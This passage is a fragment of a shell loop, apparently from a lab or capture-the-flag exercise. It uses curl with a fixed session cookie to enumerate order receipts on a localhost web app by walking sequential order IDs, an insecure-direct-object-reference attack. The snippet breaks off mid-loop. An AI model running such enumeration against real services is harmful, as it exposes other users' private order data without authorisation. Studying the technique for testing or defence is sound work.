for i in $(seq 299900 300600); do 
  body=$(curl -s -b "session=eyJ1c2VyX2lkIjoxMDAzMn0.aY30Fg.WR_BMtvPzAG54L1Ci03sfb0SejQ" http://localhost:80/order/$i/receipt);
